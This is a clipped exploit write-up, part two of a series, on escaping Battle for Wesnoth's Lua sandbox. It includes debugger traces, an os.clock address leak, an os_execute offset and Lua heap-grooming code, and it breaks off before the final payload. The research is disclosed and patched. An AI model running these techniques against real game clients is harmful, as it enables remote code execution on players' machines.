---
title: "Escaping Wesnoth's Lua Sandbox: Part 2 — 0day.gg"
source: https://0day.gg/blog/pwning-wesnoth-part-2/
source_host: 0day.gg
clip_date: 2026-09-28T18:46:00+08:00
trace_id: 25539824-793c-4278-b8f1-a72851b65cf8
content_hash: fdd710e4f62a797ec3fbd84a8b2dcbe1b9600410d8439bb760c2e645a9e82545
status: synced
tags:
  - 漏洞分析
  - 游戏安全
series: null
feed_source: 0day.gg·Apple/RE
ai_summary: 借助 Battle for Wesnoth 的 Lua 沙箱逃逸拿到 RCE：用失控 vtable 劫持虚调用，跳到仍编译在二进制里但已被移除绑定的 `os.execute` 原生回调。
ai_summary_style: key-points:weak
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3e975244-d011-81c8-b765-c911e3c9eb4b
ioc:
  cves:
    - CVE-2022-24834
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points:weak）**
>
> 借助 Battle for Wesnoth 的 Lua 沙箱逃逸拿到 RCE：用失控 vtable 劫持虚调用，跳到仍编译在二进制里但已被移除绑定的 `os.execute` 原生回调。
> 
> - **攻击原语切换：** 不用 `__call`（`generate()` 返回非平凡 `std::string`，RDI 被返回值存储占用，`this` 落在 RSI），改用 `__gc` 路径，其虚析构返回 void，`gen` 回到 RDI，首个参数完全可控。
> - **调用目标：** Wesnoth 虽阉割了 `os` 模块，但 `os_execute` 机器码仍在共享对象中；它会从 `lua_State*` 取第一个 Lua 参数并交给 `l_system`（即 `system`）。
> - **地址泄漏：** `tostring(os.clock)` 因默认走 `lua_pushfstring("%s: %p")` 泄漏代码段地址，加上离线算出的固定偏移 `-0xc0` 得到 `os_execute` 的重定位地址。
> - **堆槽复用：** `Rng` 对象无自定义 `__tostring`，可泄漏其 5016 字节堆槽地址；先 `Rng.create()` 记录地址，置 nil 后触发两轮 `collectgarbage("collect")`（先标记并跑 finalizer，再 sweep 真正释放），再用 `textdomain` 分配回收同一槽位。
> - **堆喷射达成稳定回收：** 最多 512 个 `Rng` 探针填满同尺寸槽位，命中 `target_addr` 后立即释放并分配 `textdomain`；平均 3 轮内成功，20 轮上限从未耗尽。
> - **伪造对象树：** 在单个 `textdomain` 载荷内依次排布伪造 `lua_State`、`CallInfo`、栈与 `TString`（命令串），vtable 槽 1 指向 `os_execute`，并伪造 `global_State` 的字符串表（`strt.size=1`、一个 bucket 含 `"exit"`/`"signal"`/空串缓存）以免结果回填时崩溃。
> - **披露：** 2026 年 8 月 9 日上报，CodeQL 变体查询又发现同类缺陷，已在 1.19.28 修复；利用代码公开于 wesnoth-1.18-rce 仓库。

Contents [↑ Top](#page-top)

## Recap

In [Part One](https://0day.gg/blog/pwning-wesnoth), we identified an interesting bug in one of [Battle for Wesnoth’s](https://www.wesnoth.org/) Lua engine integrations. An unprotected metatable allows for fetching a direct reference to the native metamethods, which we can use to supply an invalid receiver and trigger type confusion. We currently control all the fields of our confused object, including the vtable pointer. In this post, we’ll walk through the much more hairy process of producing a working exploit for this bug. If you’re impatient and just want to see Calcs get popped and read the full exploit, go ahead and skip to [demo](#demo) (you shouldn’t, but I’ll forgive you).

## Forging a Call

Now that we have control of a vtable pointer, we’ll want to try to invoke a useful function. If we can point it at data we control, we’ll be able to invoke function pointers of our choosing through virtual method dispatch. The question is obvious: what do we call, and what is its address?

### What’s in a name?

First, let’s examine the context around the crashing dereference to see what the register state looks like and figure out what our constraints would be for making this arbitrary call useful (original source provided after for comparison).

```text
Thread 1 received signal SIGSEGV, Segmentation fault.
impl_name_generator_call (L=0x2aaab5b27078)
    at lua_kernel_base.cpp:337
337     lua_pushstring(L, gen->generate().c_str());

(gdb) info registers
rax  0x4141414141414141
rbx  0x2aaab5b27078
rcx  0x20
rdx  0x2aaac34c4fa0
rsi  0x2aaac34c4fa0
rdi  0x2aaaab2a54c0
rbp  0x2aaaab2a54c0
rsp  0x2aaaab2a54c0
r8   0x2aaab7f88b68
r9   0x0
r10  0x2aaac34b5710
r11  0x1
r12  0x0
r13  0x2aaab7c6a210
r14  0x2aaab605dad0
r15  0xffffb5ded450
rip  0xffffb5ded483 <impl_name_generator_call(lua_State*)+51>
eflags 0x200206 [ ID IOPL=0 IF PF ]

(gdb) disassemble impl_name_generator_call
   0xffffb5ded45b <+11>: mov    rbx,rdi
   ...
   0xffffb5ded472 <+34>: mov    rbp,rsp
   0xffffb5ded475 <+37>: call   lua_touserdata(lua_State*, int)
   0xffffb5ded47a <+42>: mov    rdi,rbp
   0xffffb5ded47d <+45>: mov    rsi,rax
   0xffffb5ded480 <+48>: mov    rax,QWORD PTR [rax]
=> 0xffffb5ded483 <+51>: call   QWORD PTR [rax]
   0xffffb5ded485 <+53>: mov    rsi,QWORD PTR [rsp]
   0xffffb5ded489 <+57>: mov    rdi,rbx
   0xffffb5ded48c <+60>: call   lua_pushstring(lua_State*, char const*)

(gdb) p/x L
$1 = 0x2aaab5b27078

(gdb) p/x gen
$2 = 0x2aaac34c4fa0
```

```cpp
static int impl_name_generator_call(lua_State *L)
{
    name_generator* gen = static_cast<name_generator*>(lua_touserdata(L, 1));
    lua_pushstring(L, gen->generate().c_str());
    return 1;
}
```

At `0xffffb5ded483 <+51>`, we would have expected `name_generator* gen` to be in `RDI` (`gen` would be the implicit C++ `this` parameter), but it actually got put in `RSI` for some reason. The Itanium CXX ABI documentation has part of the answer:

> If the return type is a class type that is non-trivial for the purposes of calls, the caller passes an address as an implicit parameter. The callee then constructs the return value into this address.
> 
> \[…\]
> 
> A type is considered non-trivial for the purposes of calls if:
> 
> -   it has a non-trivial copy constructor, move constructor, or destructor, or
> -   all of its copy and move constructors are deleted.

Indeed if we check the return value for `->generate()`, it’s `std::string`, which is considered non-trivial by these requirements (it has a non-trivial destructor). You can check this for yourself in C++ by evaluating an expression like `std::is_trivially_destructible_v<std::string>` which should evaluate to `false`.

The other half of the answer comes from the [AMD64 System V ABI](https://cs61.seas.harvard.edu/site/pdf/x86-64-abi-20210928.pdf):

> If the type has class MEMORY, then the caller provides space for the return value and passes the address of this storage in %rdi as if it were the first argument to the function.

So at the call to `gen->generate()`, `RDI` has the pre-allocated storage for the `std::string` return value, and `RSI` has `this` (`gen`).

This actually makes our arbitrary call a little bit awkward. It means that when we call the function of our choice as attackers, the first argument is just a pointer to empty std::string storage! We have no control over the data it points at. So calling a function like `system(char* cmd)` is not gonna work here, we won’t be able to get a useful value for `cmd` in. We control only the data pointed to by the 2nd argument, `name_generator* gen`.

### Garbage Day

What if we found a path like `__call` which still did a virtual method call on `gen` to exploit our vtable control, but didn’t return a value? That would restore the calling pattern to `this` (`gen`) being in `RDI`, giving us a fully controlled first parameter. This is readily available. Remember the metamethods we got access to earlier through the unprotected metatable? `__call` wasn’t the only one, we also found `__gc`.

```cpp
static int impl_name_generator_collect(lua_State *L)
{
 name_generator* gen = static_cast<name_generator*>(lua_touserdata(L, 1));
 gen->~name_generator();
 return 0;
}
```

Here, the virtual destructor call `~name_generator()` has return type `void`. Triggering the call on this path gets us a better looking register setup:

```text
Thread 1 received signal SIGSEGV, Segmentation fault.
impl_name_generator_collect (L=<optimized out>)
    at lua_kernel_base.cpp:344
344     gen->~name_generator();

(gdb) info registers
rax  0x4141414141414141
rbx  0x2aaab74255a8
rcx  0x20
rdx  0x2aaac34c5700
rsi  0x2aaab5fc3140
rdi  0x2aaac34c5700
rbp  0x2aaab5fc3130
rsp  0x2aaaab2a5510
r8   0x2aaab6069ca8
r9   0x0
r10  0x2aaac34b5e70
r11  0x1
r12  0x0
r13  0x2aaab7817b70
r14  0x2aaab5fc3290
r15  0xffff8d963fa0
rip  0xffff8d963fb8
<impl_name_generator_collect(lua_State*)+24>
eflags 0x200206 [ ID IOPL=0 IF PF ]

(gdb) disassemble impl_name_generator_collect
   0xffff8d963fad <+13>: call
lua_touserdata(lua_State*, int)
   0xffff8d963fb2 <+18>: mov    rdi,rax
   0xffff8d963fb5 <+21>: mov    rax,QWORD PTR [rax]
=> 0xffff8d963fb8 <+24>: call   QWORD PTR [rax+0x8]
   0xffff8d963fbb <+27>: xor    eax,eax
   0xffff8d963fbd <+29>: add    rsp,0x8
   0xffff8d963fc1 <+33>: ret

(gdb) p/x gen
$2 = 0x2aaac34c5700
```

This is a much better call primitive. Now that we have a nicely controlled arbitrary call, where the value pointed to by the first parameter is fully controlled, can we just call `system(char* cmd)` and call it a day? It seems like it may work at first, we just assume that the command string starts with a little garbage (e.g. the vtable address) and the actual payload comes next in the command list. i.e. `\xde\xad\xbe\xef;echo "PWNED">/tmp/hax`. Bourne shell and Bash both tolerate the address garbage as `command not found`. The difficulty is that ordinary userland stack and heap addresses on 64-bit targets don’t use all eight bytes. The CPU only uses the low 48 bits of the available 64 for addressing, so the high bytes are just zero, which in a `char*` will early-terminate the string (they’re interpreted as nulls), causing most of the payload to get chopped off.

```text
# Stack address, full width
(gdb) printf "0x%016lx\n", (unsigned long)$rsp
0x00002aaaab2a54c0

# Heap address, full width
(gdb) printf "0x%016lx\n", (unsigned long)L
0x00002aaab7b75c38
```

We need a different gadget, built different, with a can-do attitude.

### Go-Go Gadget: Forbidden system()

Are there other gadgets or call targets that just execute commands? Oh, yes! In fact, an analogue of `system()` actually ships with Lua: [`os.execute()`](https://www.lua.org/pil/22.2.html)!

```c
static int os_execute (lua_State *L) {
  const char *cmd = luaL_optstring(L, 1, NULL);
  int stat;
  errno = 0;
  stat = l_system(cmd);
  if (cmd != NULL)
    return luaL_execresult(L, stat);
  else {
    lua_pushboolean(L, stat);  /* true if there is a shell */
    return 1;
  }
}
```

The native callback for `os.execute(cmd)` like most Lua callbacks accepts a `lua_State*` as its first native parameter. Inside, it just fetches the first Lua call parameter from the VM stack and dumps it into `l_system`, which is just a macro which aliases `system`. Rad. So we’d need to fake the body of `name_generator* gen` to look like a `lua_State L` in this case. Doable? Let’s check the type:

```c
struct lua_State {
  CommonHeader;
  lu_byte status;
  lu_byte allowhook;
  unsigned short nci;               /* number of items in 'ci' list */
  StkIdRel top;                     /* first free slot in the stack */
  global_State *l_G;
  CallInfo *ci;                     /* call info for current function */
  StkIdRel stack_last;              /* end of stack (last element + 1) */
  StkIdRel stack;                   /* stack base */
  UpVal *openupval;                 /* list of open upvalues in this stack */
  StkIdRel tbclist;                 /* list of to-be-closed variables */
  GCObject *gclist;
  struct lua_State *twups;          /* list of threads with open upvalues */
  struct lua_longjmp *errorJmp;     /* current error recover point */
  CallInfo base_ci;                 /* CallInfo for first level (C calling Lua) */
  volatile lua_Hook hook;
  ptrdiff_t errfunc;                /* current error handling function (stack index) */
  l_uint32 nCcalls;                 /* number of nested (non-yieldable | C)  calls */
  int oldpc;                        /* last pc traced */
  int basehookcount;
  int hookcount;
  volatile l_signalT hookmask;
};
```

We mostly care about the fields that would collide with our forged vtable pointer in the early bytes, like `CommonHeader`.

```c
#define CommonHeader struct GCObject *next; lu_byte tt; lu_byte marked
```

We’re cooking, this looks good. The vtable pointer would be interpreted as `GCObject* next`, which is just part of the linked list bookkeeping for garbage collection.

Okay, so if we can locate this native callback with some kind of infoleak and can stick the command string on the Lua stack, we can choose this as our call target. This gets a bit hairy, as it entails crafting an entire fake `lua_State` inside the body of `name_generator gen`. Given that we can create `textdomain` objects that just copy our bytes into a body buffer on the heap though, this isn’t too bad. We can probably forge all these fields no problem, as long as we can make the pointers valid. We’ll have to find a nice way to leak the addresses of the fake objects we make. We’ll work on solving that later. For now, this path seems promising.

You may be suspicious upon recall from [Part One](https://0day.gg/blog/pwning-wesnoth) though, that the `os` module was gutted, removing `os.execute`:

> All of `os` has also been gutted, with the exception of `clock`, `date`, `time`, and `difftime`. `debug` has suffered a similar fate, leaving only `backtrace` intact. Notably missing from the available modules list is `io`, which would have given us lots of possible file operation primitives, and `package`, which would have exposed native modules. Though, there is a replacement `filesystem` module created which exposes some read-only utilities such as `have_file`, `read_file`, `canonical_path`, `image_size`, `have_asset`, and `resolve_asset`.

However, this doesn’t matter. Wesnoth prevents this function from being exposed in the `os` module, but the native callback is still compiled into the shared object. You just can’t access the name binding from your Lua script. The machine code is still present, we just have to find it in-process.

Things are shaping up. We have a call target candidate and control of the first argument passed in, a pointer to a fairly complex struct. We think we can forge the struct fields and those fields’ fields using `textdomain` to craft arbitrary object layouts, as long as we can get some high quality address leak primitives so that we can craft valid pointers. Now, about those infoleaks…

## Leaky Strings

Lua has had a longstanding quirk that is perfect for our use case. Did you know that `tostring()` in Lua scripts just prints the address of the argument for some types? It’s curiously documented in passing in [Programming in Lua 5.0](https://www.lua.org/pil/13.3.html), showing off printing a table object’s address. The technique has been around for a while:

-   [Pwning Lua through ’load’](https://saelo.github.io/posts/pwning-lua-through-load.html)
-   [Fuzzing Farm #4: Hunting and Exploiting 0-day (CVE-2022-24834)](https://ricercasecurity.blogspot.com/2023/07/fuzzing-farm-4-hunting-and-exploiting-0.html)
-   [LuaJIT Sandbox Escape: The Saga Ends](https://pwner.gg/blog/2022-12-30-luajit-sandbox-escape)

Why does this happen? Under the hood, the Lua script function `tostring()` delegates to the native `luaL_tolstring()`. The logic for stringification is pretty straightforward:

-   if the target object has a `__tostring()` metamethod implementation, call that and use the result
-   if not, get the contents of the metavalue `__name` if present (otherwise the Lua type’s name), and put together a pretty string containing the type name and its address (obtained by `lua_topointer()`)

```c
if (luaL_callmeta(L, idx, "__tostring")) {  /* metafield? */
  if (!lua_isstring(L, -1))
    luaL_error(L, "'__tostring' must return a string");
}
else {
  /* number, string, boolean and nil cases omitted */
  int tt = luaL_getmetafield(L, idx, "__name");  /* try name */
  const char *kind = (tt == LUA_TSTRING) ? lua_tostring(L, -1) :
                                             luaL_typename(L, idx);
  lua_pushfstring(L, "%s: %p", kind, lua_topointer(L, idx));
}
```

So anything that isn’t a number, string, boolean, `nil`, and doesn’t have a `__tostring` hits the leak. Ideally we could just `tostring(os.execute)`, but as discussed earlier, `os.execute` is intentionally removed in Wesnoth, so this binding is not even visible to us. However, other native functions are still exposed, such as `os.clock`. We can pass the function itself to `tostring()` to leak its native callback (`os_clock`) address in the code section. That gives us the base we need. We’ll do the following:

![ASLR-dependent os\_clock address and fixed offset to os\_execute](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bec463f7915b5607.svg)

ASLR-dependent os_clock address and fixed offset to os_execute

1.  Calculate the static offset from the `os_clock` function to the `os_execute` function within the image offline, and store it in our exploit
2.  During the exploit, leak `os_clock` ’s address and add the known offset of `os_execute` to get the relocated virtual address of `os_execute`
3.  ???
4.  Profit?

Let’s get the address of `os_clock` and `os_execute` in this build and calculate the offset. You can do this with your favorite disassembler or debugger. I’ll just do it in gdb.

```text
Thread 1 hit Breakpoint 1, lua_rng::impl_rng_create
    (L=0x2aaab85c3518) at /build/source/src/scripting/lua_rng.cpp:39

(gdb) p/x (unsigned long)&os_clock
$1 = 0xffffad66bf10
(gdb) p/x (unsigned long)&os_execute
$2 = 0xffffad66be50
(gdb) printf "-0x%lx\n", (unsigned long)&os_clock-(unsigned long)&os_execute
-0xc0
```

So leaking `os_execute` looks like

```lua
--- Identified offset for this build
local OS_EXECUTE_OFFSET = -0xc0

local clock_leak = tostring(os.clock)
local clock_addr = tonumber(clock_leak:match("0x(%x+)"), 16)
local os_execute_addr = clock_addr + OS_EXECUTE_OFFSET
```

We have our virtual call address target, one problem down.

## (text)Domain Expansion: Malevolent Stack

The next annoying part is getting the addresses of our forged objects created using `textdomain`. Recall from earlier that we need to fake a whole `lua_State` struct. Some of its fields are pointers to other structs, which must also be allocated. And some of those structs may also point to other structs… These pointers may be dereferenced during the virtual call into `os_execute`. Especially important are the VM stack pointers and its metadata, as we are actually fetching the payload command from the VM stack! It has to be valid enough to make it through argument fetching. We can see by tracing down through `luaL_optstring()` which fetches the string arg what’s accessed. Pay attention to what is accessed through `L`:

```c
/* luaL_optstring(L, n, d) is a macro for luaL_optlstring(L, n, d, NULL) */
LUALIB_API const char *luaL_checklstring (lua_State *L, int arg, size_t *len) {
  const char *s = lua_tolstring(L, arg, len);
  if (l_unlikely(!s)) tag_error(L, arg, LUA_TSTRING);
  return s;
}

LUALIB_API const char *luaL_optlstring (lua_State *L, int arg,
                                        const char *def, size_t *len) {
  if (lua_isnoneornil(L, arg)) {
    if (len)
      *len = (def ? strlen(def) : 0);
    return def;
  }
  else return luaL_checklstring(L, arg, len);
}
```

```c
LUA_API const char *lua_tolstring (lua_State *L, int idx, size_t *len) {
  TValue *o;
  lua_lock(L);
  o = index2value(L, idx);
  if (!ttisstring(o)) {
    if (!cvt2str(o)) {  /* not convertible? */
      if (len != NULL) *len = 0;
      lua_unlock(L);
      return NULL;
    }
    luaO_tostring(L, o);
    luaC_checkGC(L);
    o = index2value(L, idx);  /* previous call may reallocate the stack */
  }
  if (len != NULL)
    *len = tsslen(tsvalue(o));
  lua_unlock(L);
  return getstr(tsvalue(o));
}
```

```c
static TValue *index2value (lua_State *L, int idx) {
  CallInfo *ci = L->ci;
  if (idx > 0) {
    StkId o = ci->func.p + idx;
    api_check(L, idx <= ci->top.p - (ci->func.p + 1), "unacceptable index");
    if (o >= L->top.p) return &G(L)->nilvalue;
    else return s2v(o);
  }
  /* negative-index and pseudo-index branches omitted */
}
```

So the essential bits are:

-   `L->ci` pointing to usable `CallInfo`
-   `ci->func.p` pointing to the function slot, with argument 1 in the next slot
-   `L->top.p` puts the argument inside the live stack range
-   The `TValue` at `ci->func.p + 1` has to be tagged as a Lua string type, and point to a valid Lua `TString` object holding the command

![lua\_State ci and top pointers lead through CallInfo and the argument’s TValue to the command TString](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/926216039539e0be.svg)

lua_State ci and top pointers lead through CallInfo and the argument’s TValue to the command TString

Looks pretty gross. Doable, just gross.

How do we get the address of our `textdomain` objects such that we can wire it all up? Unfortunately the `tostring` leak doesn’t work here. `textdomain` defines its own `__tostring` metamethod, which would get called instead of the default pointer leaking stringifier. Womp womp.

But what if we didn’t have to leak the address of the `textdomain` at all?

## Predicting Rng

Alright, I lied a bit. We still need to leak object addresses, just not the *`textdomain`* object. There are other heap allocated object types exposed in Wesnoth’s Lua VM which don’t define their own `__tostring`, meaning they’re eligible targets for our existing infoleak primitive. Do a little exploring and you’ll find things like `Rng`!

```cpp
static const char * Rng = "Rng";

int impl_rng_create(lua_State* L)
{
 uint32_t seed = lua_kernel_base::get_lua_kernel<lua_kernel_base>(L).get_random_seed();
 new(L) mt_rng(seed);
 luaL_setmetatable(L, Rng);

 return 1;
}
```

```cpp
void load_tables(lua_State* L)
{
 luaL_newmetatable(L, Rng);

 static luaL_Reg const callbacks[] {
  { "create",         &impl_rng_create},
  { "__gc",           &impl_rng_destroy},
  { "seed",      &impl_rng_seed},
  { "draw",     &impl_rng_draw},
  { nullptr, nullptr }
 };
 luaL_setfuncs(L, callbacks, 0);

 lua_pushvalue(L, -1); //make a copy of this table, set it to be its own __index table
 lua_setfield(L, -2, "__index");

 lua_setglobal(L, Rng);
}
```

No `__tostring` override, so we can make these and leak their address on the heap. The body bytes of this aren’t very useful, though. The userdata will contain an `mt_rng`.

```cpp
class mt_rng
{
public:
 explicit mt_rng(uint32_t seed);
 // Other methods omitted.

private:
 uint32_t random_seed_;
 std::mt19937 mt_;
 unsigned int random_calls_;
 // Other methods omitted.
};
```

We don’t control these fields through the constructor, so it’s not really a good object faking primitive. Then why are we bothering with this thing if we can leak its location but not control its bytes? Well, if it’s large enough, we can use it to allocate a heap slot, leak the address of that slot, and then try to get it freed. Then we can get other fake objects padded up so that they take up a similar slot size, and see if we can reclaim the previously freed slot. That would land a `textdomain` at an address that we’ve leaked! Obviously there’s a bit of low level stuff to work out here. How big is the inner `mt_rng` really? Can each of our forged object types fit inside it, or do we need to find a different target? Can we reliably get it freed? Can we reliably reclaim it?

### Slot Sizes

The first one is fairly easy to answer. We can just make an `Rng` object in a multiplayer Lua script, and inspect the memory in a debugger.

```lua
-- Dummy Rng object to inspect
local rng = Rng.create()
```

```text
(gdb) break lua_rng::impl_rng_create
Breakpoint 1 at 0xffff9ec38610: file lua_rng.cpp,
line 39.
(gdb) continue
Thread 1 hit Breakpoint 1, lua_rng::impl_rng_create
   (L=0x2aaab75da668) at lua_rng.cpp:39

(gdb) p sizeof(randomness::mt_rng)
$1 = 5016
(gdb) p sizeof(lua_State)
$2 = 200
(gdb) p sizeof(CallInfo)
$3 = 64
(gdb) p sizeof(StackValue)
$4 = 16
(gdb) p sizeof(TValue)
$5 = 16
(gdb) p sizeof(TString)
$6 = 32
(gdb) p sizeof(global_State)
$7 = 1416
```

Wow, 5016 bytes! That’s actually a pretty big heap slot. All the other types fit inside that easily. In fact, we could probably put all of our faked structures and fields end to end inside of one `mt_rng` allocation. Then wiring up the pointers between fields would be easy, the address of each object would all be predictable and relative to the single leaked base address. We’ll have to pad the `textdomain` object up a little bit so that it at least hits the right size class to reclaim the freed `mt_rng`. Alright, it’s shaping up.

### Taking Out the Trash

Next, to make this strategy work, we’d need to find a path that we can use to reliably free the `Rng` ’s consumed heap storage so that we can plop a new allocation in its place. While the metatable is unprotected, meaning we can fetch a handle to `__gc` and just call it, it turns out to not be that simple. Let’s do some homework and check out how the garbage collector works.

`__gc` is responsible for destructing the userdata’s inner object, in this case it calls `~mt_rng()`.

```cpp
int impl_rng_destroy(lua_State* L)
{
 mt_rng * d = static_cast< mt_rng *> (luaL_testudata(L, 1, Rng));
 if (d == nullptr) {
  ERR_LUA << "rng_destroy called on data of type: " << lua_typename( L, lua_type( L, 1 ) );
  ERR_LUA << "This may indicate a memory leak, please report at bugs.wesnoth.org";
  lua_pushstring(L, "Rng object garbage collection failure");
  lua_error(L);
 } else {
  d->~mt_rng();
 }
 return 0;
}
```

But this by itself doesn’t free the *userdata* object on the heap, it just destructs the data inside it. So the heap slot will still be held by the now empty userdata object. The process to get this userdata released is a little more specific. Here’s how it goes:

1.  An object (that has a finalizer) becomes *unreachable*. Unreachable here basically means it can’t be reached by following references from its GC roots, which include live Lua stack values, globals, the registry and objects reachable through it, etc. This prompts the GC to move it to the to-be-finalized list `GCObject* tobefnz`. It is marked specifically so that it survives this GC cycle. This is the `marked` field in `CommonHeader`, which also gets embedded in `Udata` (userdata)
    
    ```c
    origweak = g->weak; origall = g->allweak;
    separatetobefnz(g, 0);  /* separate objects to be finalized */
    work += markbeingfnz(g);  /* mark objects that will be finalized */
    work += propagateall(g);  /* remark, to propagate 'resurrection' */
    ```
    
    ```c
    static lu_mem markbeingfnz (global_State *g) {
      GCObject *o;
      lu_mem count = 0;
      for (o = g->tobefnz; o != NULL; o = o->next) {
        count++;
        markobject(g, o);
      }
      return count;
    }
    ```
    
2.  The GC sweeps, calling finalizers on marked objects. This is where the GC invokes `__gc` on the marked object.
    
    ```c
    case GCSswpend: {  /* finish sweeps */
      checkSizes(L, g);
      g->gcstate = GCScallfin;
      work = 0;
      break;
    }
    case GCScallfin: {  /* call remaining finalizers */
      if (g->tobefnz && !g->gcemergency) {
        g->gcstopem = 0;  /* ok collections during finalizers */
        work = runafewfinalizers(L, GCFINMAX) * GCFINALIZECOST;
      }
      else {  /* emergency mode or no more finalizers */
        g->gcstate = GCSpause;  /* finish collection */
        work = 0;
      }
      break;
    }
    ```
    
    ```c
    static void GCTM (lua_State *L) {
      global_State *g = G(L);
      const TValue *tm;
      TValue v;
      lua_assert(!g->gcemergency);
      setgcovalue(L, &v, udata2finalize(g));
      tm = luaT_gettmbyobj(L, &v, TM_GC);
      if (!notm(tm)) {  /* is there a finalizer? */
        int status;
        lu_byte oldah = L->allowhook;
        int oldgcstp  = g->gcstp;
        g->gcstp |= GCSTPGC;  /* avoid GC steps */
        L->allowhook = 0;  /* stop debug hooks during GC metamethod */
        setobj2s(L, L->top.p++, tm);  /* push finalizer... */
        setobj2s(L, L->top.p++, &v);  /* ... and its argument */
        L->ci->callstatus |= CIST_FIN;  /* will run a finalizer */
        status = luaD_pcall(L, dothecall, NULL, savestack(L, L->top.p - 2), 0);
        L->ci->callstatus &= ~CIST_FIN;  /* not running a finalizer anymore */
        L->allowhook = oldah;  /* restore hooks */
        g->gcstp = oldgcstp;  /* restore state */
        if (l_unlikely(status != LUA_OK)) {  /* error while running __gc? */
          luaE_warnerror(L, "__gc");
          L->top.p--;  /* pops error object */
        }
      }
    }
    ```
    
3.  In the *next* GC cycle, when the GC sweeps again, `sweeplist()` will call `freeobj()` for all those now-finalized userdata objects. This is where the allocation actually gets released, freeing up the heap slot for our reclaim attempt.
    
    ```c
    for (i = 0; *p != NULL && i < countin; i++) {
      GCObject *curr = *p;
      int marked = curr->marked;
      if (isdeadm(ow, marked)) {  /* is 'curr' dead? */
        *p = curr->next;  /* remove 'curr' from list */
        freeobj(L, curr);  /* erase 'curr' */
      }
      else {  /* change mark to 'white' */
        curr->marked = cast_byte((marked & ~maskgcbits) | white);
        p = &curr->next;  /* go to next element */
      }
    }
    ```
    
    ```c
    case LUA_VUSERDATA: {
      Udata *u = gco2u(o);
      luaM_freemem(L, o, sizeudata(u->nuvalue, u->len));
      break;
    }
    ```
    

All of this is to say, we can’t just directly call `__gc` once through the unprotected metatable and free up its slot. We actually have to do the whole song and dance of making the object unreachable, and triggering two full GC cycles. Once to mark it and call the finalizer, and once to dealloc during sweep.

This is actually really easy though. We control how many live references to the `Rng` exist, it’s determined by the logic of our Lua script and where we use the variable. Lua also helpfully exposes a `garbagecollect(operation)` function which, you guessed it, can be used to manage the GC lifecycle. There’s [an operation](https://github.com/lua/lua/blob/1ab3208a1fceb12fca8f24ba57d6e13c5bff15e3/lbaselib.c#L199-L205) specifically for triggering a GC cycle, `"collect"`. Rad.

So we can basically do:

```lua
-- Alloc a heap slot
local rng = Rng.create()

-- Make it unreachable, removing the only remaining reference
rng = nil

-- Two GC cycles (mark, sweep, free)
garbagecollect("collect");
garbagecollect("collect");
```

Most of our strategy is proving to be fairly practical. We can fake object layouts with `textdomain`, leak a slot address with `Rng`, and now the final piece is to see if we can reliably reclaim an old `Rng` slot with our `textdomain` allocation, which would put it at the leaked address.

## A Little Feng Shui

### Allocators 4 Dummiez

Making a heap slot reclaim reliable initially seems like the flakiest part of the chain. However, scripting engines tend to have *amazing* heap grooming primitives. We can, in a Lua script we fully control, make *any kind of object, in whatever order we want, with whatever constructor parameters we want*. We can make *as many as we want*. And in the case of Lua, we can also pause or manually trigger garbage collection with `garbagecollect`. To apply these things to successfully achieve a reliable reclaim, we only need to reflect on some basic heap management ideas.

The heap allocator is kind of like a valet managed parking lot. You have many parking spots. You have some small spots, some medium spots, some big spots. When a car shows up, you have to efficiently slot it into the right size parking spot, and not a size larger. If you routinely put the small cars in the big spots, you won’t have any big spots left when a big car shows up! To make the most efficient usage of space in the overall lot, we also probably group similarly sized parking spots in arenas together.

When the lot is pretty sparse, there’s lots of possible spots in any given size class a car could park in. We can’t easily predict which will be taken by a new incoming car. [![Parking lot with many open spaces in the medium arena](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d001b6e42a369d90.svg)](https://0day.gg/images/heap-valet-low-occupancy.svg)

However when the lot is very dense, with lots of parked cars, only a few spots will remain in each size class. We can much more easily predict where a car will land within a size class! [![The same parking lot with only one open space in the medium arena](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c6b8934fdd6063f6.svg)](https://0day.gg/images/heap-valet-high-occupancy.svg)

This is the heart of the reclaim strategy. Say we want to reliably reclaim a slot in the medium lot. We can bring in a bunch of medium cars to fill up the spots, then have one of them leave. That will open up a spot, so the next car coming in (even a car that isn’t ours!) is very likely to park in that spot. With enough lot pressure, we can get this to be almost guaranteed. And once that next car comes in, we know exactly where it will be: we just pulled out of that spot!

### Lua Lot Larceny

Alright. Time to steal some parking spots. This part was mostly experimentation with a fair amount of trial and error.

Since the interpreter is single threaded here, and we’re the only one making allocations in this size slot, we can probe to check if we are reclaiming the right slot. We can try to reclaim with another `Rng` object just to test the waters. If we don’t successfully reclaim, go again and make another allocation to increase pressure. If the address of the reclaim object matches the address of the freed object (`target`), we know it’s working. Once we have a working heap layout, we breathe slowly and make no sudden moves. We do one last free and immediately allocate the `textdomain` for real, which we expect to take that slot.

```lua
-- Allocate the target slot and learn its address.
local target = Rng.create()
local target_addr = parse_addr(tostring(target))

-- Here is where we'd build the payload with pointers relative to target_addr. 
-- For demonstration, we're only showing the reclaim shenanigans.
-- Free this slot up, we have its address saved.
target = nil
collectgarbage("collect")
collectgarbage("collect")
collectgarbage("collect")

local fillers = table.pack()
local matched_probe = nil

-- Allocate up to 512 Rng objects. These will fill up the slots. 
-- Hopefully, one of the filled slots is `target`!
for fill = 1, 512 do
   -- Allocate a probe and check where it landed. Did we land in `target`?
   local probe = Rng.create()
   local probe_addr = parse_addr(tostring(probe))

   -- if we did, then we're ready to try to reclaim with textdomain
   -- pressure and layout are sufficient
   if probe_addr == target_addr then
       matched_probe = probe
       break
   end

   -- No match? Store a reference to this allocation in a list. 
   -- This prevents the GC from randomly freeing it during sweeps, so we
   -- can keep the pressure up
   fillers[#fillers + 1] = probe
end

-- We hit a successful reclaim on next-alloc, let's go for it!
if matched_probe ~= nil then
   matched_probe = nil
   collectgarbage("collect")
   collectgarbage("collect")
   collectgarbage("collect")

   -- Create our textdomain where our forged objects will go.
   -- Assuming this worked, the address of `td` is `target_addr`
   local td = wesnoth.textdomain(payload)
end
```

We can do multiple rounds of this, pressuring the allocator and probing until we get a working setup, before we do the real reclaim with `textdomain`. I found that on average, a successful reclaim was achieved within 3 attempts (of up to 512 probes each). This can be done very quickly, within a few seconds. I never observed a run that consumed the full 20 attempts without successfully reclaiming a slot at a known address.

## Final Forging

